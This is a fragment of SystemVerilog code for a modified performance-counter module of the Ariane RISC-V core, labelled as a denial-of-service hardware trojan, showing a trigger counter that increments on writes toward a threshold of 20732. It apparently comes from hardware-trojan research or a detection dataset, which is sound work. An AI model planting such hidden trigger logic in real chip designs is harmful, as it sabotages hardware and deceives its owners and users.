...
module perf_counters_trojan_DoS
  import ariane_pkg::*;
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=20732)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 20732;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (we_i) trojan_counter <= trojan_counter + 1;
